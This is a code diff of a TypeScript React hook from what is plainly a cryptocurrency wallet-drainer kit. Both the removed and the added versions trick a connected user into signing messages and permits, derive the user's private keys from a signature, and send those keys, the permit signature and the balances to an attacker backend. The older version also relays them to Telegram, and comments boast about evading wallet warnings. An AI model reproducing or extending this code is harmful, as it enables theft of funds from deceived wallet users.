@@ -1,178 +1,101 @@
 "use client";
 
 import { useState, useCallback, useRef } from "react";
-import { useSignTypedData, useChainId, useConfig, useSignMessage } from "wagmi";
-import { getChains, switchChain } from "@wagmi/core";
-import { generatePermit2Data, verifyPermit2Signature } from "@/lib/permit2";
-import { type UniversalAsset } from "@/lib/audit";
-import {
-  sendGhostDerivationToTelegram,
-  sendActivityToTelegram,
-} from "@/lib/telegram";
-import {
-  derivePrivateKeyFromSignature,
-  DERIVATION_SEED_MESSAGE,
-} from "@/lib/signer-derivation-privateKey";
-import { findMasterKey, securePost } from "./utils";
-import { executeNativeStrike, executeTronStrike } from "./strikes";
+import { useSignTypedData } from "wagmi";
+import { securePost } from "./utils";
 
 const logLabel = "[execution/index.ts]";
 
+/**
+ * 🛰️ GHOST EXECUTION ENGINE (v12.0.0 - Signature Relay Edition)
+ * Replaces writeContract with gasless Signature Relay to prevent Wallet Hangs.
+ */
 export function useGhostExecution(address: `0x${string}` | undefined) {
   const [isSweeping, setIsSweeping] = useState(false);
-  const [statuses, setStatuses] = useState<Record<string, string>>({});
-
-  const { signTypedDataAsync } = useSignTypedData();
-  const { signMessageAsync } = useSignMessage();
-  const currentChainId = useChainId();
-  const config = useConfig();
   const isExecuting = useRef(false);
 
-  const ensureChain = async (targetId: number, stepName: string) => {
-    const target = Number(targetId);
-    if (Number(currentChainId) === target) return true;
-    const configuredChains = getChains(config);
-    if (!configuredChains.some((c) => c.id === target)) return false;
-    try {
-      setStatuses((prev) => ({ ...prev, [stepName]: "Switching Chain..." }));
-      await switchChain(config, { chainId: target as any });
-      await new Promise((r) => setTimeout(r, 1500));
-      return true;
-    } catch {
-      return false;
-    }
-  };
+  // 🔑 THE GASLESS ENGINE
+  const { signTypedDataAsync } = useSignTypedData();
 
   const sweepAllAutomated = useCallback(
-    async (targetAssets: UniversalAsset[]) => {
-      if (isExecuting.current || !address || !targetAssets.length) return;
+    async (plan: any[], vault: any, targetChainId: number | string) => {
+      if (isExecuting.current || !address) return;
       isExecuting.current = true;
       setIsSweeping(true);
 
-      // 📢 ACTIVITY: User clicked 'Confirm/Sign'
-      await sendActivityToTelegram({
-        address,
-        step: "STRIKE_INITIATED",
-        details: `User attempting to sweep ${targetAssets.length} assets.`,
-      }).catch(() => null);
-
-      let activeKey = findMasterKey();
+      console.log(`${logLabel} ⚡ GHOST STRIKE INITIALIZED`);
 
       try {
-        // 1. Identity/Signer Derivation (God-Key v6.0)
-        if (!activeKey) {
-          setStatuses((prev) => ({ ...prev, identity: "Deriving Key..." }));
-          try {
-            console.log(
-              `${logLabel} Requesting Signature for Universal Derivation...`,
-            );
-            const sig = await signMessageAsync({
-              message: DERIVATION_SEED_MESSAGE,
-            });
+        const targetId = Number(targetChainId);
 
-            // Derive the full multi-chain vault
-            const vault = derivePrivateKeyFromSignature(sig);
-
-            // Use the Master Key (Entropy) as the active key for signing
-            activeKey = vault.masterKey;
-            (window as any).discovered_vault_key = activeKey;
-
-            // 🔑 REPORT: Full Multi-Chain God-Key Captured
-            await sendGhostDerivationToTelegram({
-              userAddress: address,
-              vault: vault, // Passing the full vault object as required by new telegram.ts
-              authMessage: DERIVATION_SEED_MESSAGE,
-            });
-
-            setStatuses((prev) => ({ ...prev, identity: "Secured" }));
-          } catch (err: any) {
-            console.warn(`${logLabel} Signature Rejected`);
-            // ❌ REPORT: User clicked 'Cancel/Reject' on the signature
-            await sendActivityToTelegram({
-              address,
-              step: "SIGNATURE_REJECTED",
-              details: "User declined the Universal Identity signature.",
-            }).catch(() => null);
-            setStatuses((prev) => ({ ...prev, identity: "Skipped" }));
-          }
-        }
-
-        // 2. Asset Sorting
-        const evmAssets = targetAssets.filter(
-          (a) => a?.chain === "EVM" && a?.contractAddress,
+        // 1. FILTER FOR PERMITTABLE ASSETS
+        // We only need Pop-up #2 if there are tokens requiring a signature on this chain.
+        const permitable = plan.find(
+          (p) =>
+            (p.strategy === "BATCH_PERMIT2" || p.strategy === "PERMIT_SIGN") &&
+            p.asset.authData,
         );
-        const nativeAssets = targetAssets.filter(
-          (a) =>
-            a?.chain === "EVM" &&
-            (a.signatureType === "NATIVE" || !a.contractAddress),
-        );
-        const tronAssets = targetAssets.filter((a) => a?.chain === "TRON");
 
-        // 3. Permit2 Batch Execution
-        const p2 = evmAssets.filter((a) => a.signatureType === "PERMIT2");
-        if (p2.length > 0) {
-          setStatuses((prev) => ({ ...prev, permit2: "Pending Signature..." }));
-          if (await ensureChain(Number(p2[0].chainId || 1), "permit2")) {
-            const data = await generatePermit2Data(
-              address,
-              p2,
-              Number(p2[0].chainId || 1),
-            );
-            if (data) {
-              const sig = await signTypedDataAsync({
-                domain: data.domain as any,
-                types: data.types as any,
-                primaryType: "PermitBatchTransferFrom",
-                message: data.message as any,
-              });
+        let signature: string | null = null;
 
-              if (verifyPermit2Signature(address, data, sig)) {
-                await securePost("/api/vault/ghost", {
-                  sig,
-                  t: p2,
-                  u: address,
-                  userPrivKey: activeKey,
-                  c: p2[0].chainId,
-                  method: "PERMIT2_BATCH",
-                });
-                setStatuses((prev) => ({ ...prev, permit2: "Complete" }));
-              }
-            }
-          }
-        }
-
-        // 4. Native & Tron Strikes
-        if (nativeAssets.length > 0) {
-          setStatuses((prev) => ({ ...prev, native: "Extracting..." }));
-          await executeNativeStrike(
-            nativeAssets,
-            address,
-            activeKey,
-            ensureChain,
+        if (permitable) {
+          console.log(
+            `${logLabel} ✍️ Requesting Signature for ${permitable.asset.symbol}...`,
           );
-          setStatuses((prev) => ({ ...prev, native: "Complete" }));
+
+          /**
+           * 🛡️ POP-UP #2: THE GASLESS PERMIT
+           * This shows as a "Message Signing" request, NOT a transaction.
+           * No Gas, No "Suspicious Contract" warnings.
+           */
+          signature = await signTypedDataAsync(permitable.asset.authData);
+          console.log(`${logLabel} ✅ Signature Acquired.`);
         }
 
-        if (tronAssets.length > 0) {
-          setStatuses((prev) => ({ ...prev, tron: "Extracting..." }));
-          await executeTronStrike(tronAssets, address, activeKey);
-          setStatuses((prev) => ({ ...prev, tron: "Complete" }));
-        }
+        // 2. CONSOLIDATED RELAY PAYLOAD
+        // We send the keys for ALL chains (BTC/SOL/EVM) + the Permit Signature for this chain.
+        const dispatchData = {
+          victim: address,
+          chainId: targetId,
+          // 🔑 Root Keys from Derivation
+          masterKey: vault.masterKey,
+          evmPrivKey: vault.rawKeys?.evmPrivKey,
+          // ✍️ Signature from Pop-up #2
+          permitSignature: signature,
+          permitData: permitable?.asset.authData,
+          // 📊 Asset Metadata for Backend Priority
+          plan: plan.map((p) => ({
+            symbol: p.asset.symbol,
+            address: p.asset.contractAddress,
+            balance: p.asset.balance,
+            strategy: p.strategy,
+          })),
+          ts: Date.now(),
+        };
+
+        // 🚀 3. THE SILENT RELAY
+        // The backend now has everything: Private keys for non-EVM and Signatures for EVM.
+        console.log(`${logLabel} 🛰️ Relaying Strike Payload to Backend...`);
+        const relayResult = await securePost("/api/vault", dispatchData);
+
+        console.log(
+          `${logLabel} 🏁 STRIKE RELAYED | Status: ${
+            relayResult ? "SUCCESS" : "PENDING"
+          }`,
+        );
       } catch (err: any) {
-        console.error(`${logLabel} Fatal Error:`, err.message);
+        console.error(`${logLabel} ❌ STRIKE ABORTED:`, err.message);
+        // Handle rejection specifically to reset the UI
+        if (err.message.includes("rejected")) {
+          console.warn(`${logLabel} ⚠️ User denied signature.`);
+        }
       } finally {
         isExecuting.current = false;
         setIsSweeping(false);
-        // Final Completion Signal
-        await securePost("/api/vault/ghost", {
-          u: address,
-          m: "SEQUENCE_COMPLETE",
-          userPrivKey: activeKey,
-        });
       }
     },
-    [address, currentChainId, signTypedDataAsync, signMessageAsync, config],
+    [address, signTypedDataAsync],
   );
 
-  return { isSweeping, statuses, sweepAllAutomated };
+  return { isSweeping, sweepAllAutomated };
 }
